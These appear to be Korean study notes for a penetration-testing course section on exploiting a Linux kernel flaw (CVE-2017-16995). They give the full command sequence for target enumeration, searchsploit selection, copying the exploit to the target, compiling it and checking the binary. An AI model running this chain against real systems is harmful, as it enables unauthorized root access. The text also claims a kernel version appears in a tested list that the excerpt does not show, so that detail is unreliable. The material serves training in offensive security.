# 18.4.3 커널 취약점 익스플로잇

> **Exploiting Kernel Vulnerabilities** · PEN-200 §18.4.3

커널 익스플로잇은 강력하지만 성공 여부가 **커널 버전만이 아니라 배포판 계열(Debian·RHEL·Gentoo 등)에도 걸림.** 그래서 먼저 대상 식별 정보를 정확히 모아야 함 — `/etc/issue`(로그인 프롬프트 전에 출력되는 시스템 식별 문구), `uname -r`(커널 릴리스), `arch`(아키텍처).

```
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
```

커널 릴리스와 아키텍처는 따로 확인함.

```
joe@ubuntu-privesc:~$ uname -r
4.4.0-116-generic
joe@ubuntu-privesc:~$ arch
x86_64
```

이 정보를 키워드로 `searchsploit` 을 돌림. 결과가 많으므로 `grep` 으로 대상 커널보다 낮은 버전대와 무관한 4.8 계열을 걸러냄.

후보 중 `linux/local/45010.c` 를 고름 — 비교적 최신이고 **4.13.9 미만 전체를 대상으로 해 4.4.0-116 을 포함**하기 때문임.

익스플로잇 소스를 곧바로 컴파일하지 말고 **앞부분 주석을 먼저 읽을 것**(`head 45010.c -n 20`). 여기에 테스트된 커널 목록과 컴파일 명령이 적혀 있음 — 이 사례에서는 `4.4.0-116-generic` 이 테스트 목록에 있어 적합성이 확인되고, `gcc cve-2017-16995.c -o cve-2017-16995` 라는 지시가 있어 소스 파일명을 그에 맞춰 바꾸면 지시를 그대로 붙여 쓸 수 있음.

```
kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .
kali@kali:~$ head 45010.c -n 20
/*
  Credit @bleidl, this is a slight modification to his original POC

  For details on how the exploit works, please visit
  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
  Tested on Ubuntu 16.04 with the following Kernels
  4.4.0-31-generic
  4.4.0-62-generic

  internet@client:~/cve-2017-16995$ ./cve-2017-16995
```

**컴파일은 대상 아키텍처에 맞춰야 함.** 대상에 컴파일러가 없으면 공격 머신이나 대상 OS·아키텍처를 재현한 샌드박스에서 크로스 컴파일해야 하지만, 이 대상에는 gcc 가 이미 있으므로 **소스를 옮겨 대상에서 직접 컴파일**함 — 필요한 라이브러리 버전이 그대로 맞아 크로스 컴파일 호환성 문제의 위험이 줄어듦.

*Kali — 소스 파일명을 익스플로잇 주석의 지시에 맞춤*

```
kali@kali:~$ mv 45010.c cve-2017-16995.c
```

*Kali — SCP 로 대상에 소스 전송*

```
kali@kali:~$ scp cve-2017-16995.c joe@192.168.123.216:
```

*대상 — gcc 로 컴파일*

```
joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995
```

gcc 가 오류를 안 내면 성공으로 봐도 됨. 산출물의 아키텍처는 `file` 로 확인함 — 대상과 일치해야 함.

```
joe@ubuntu-privesc:~$ file cve-2017-16995

linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=588d687459a0e60bc6cb984b5180ec8c3558dc33, not stripped
```

이 익스플로잇은 검증기를 통과하는 악성 BPF 프로그램으로 커널 메모리를 읽고 **현재 프로세스의 cred 구조체를 덮어써** 권한을 얻으므로, 성공 시 셸이 곧바로 uid 0 으로 뜸. 흐름 정리 — 대상 식별 → searchsploit 으로 후보 선별 → 소스 주석으로 적합성·컴파일 방법 확인 → 아키텍처 맞춰 컴파일 → 실행.
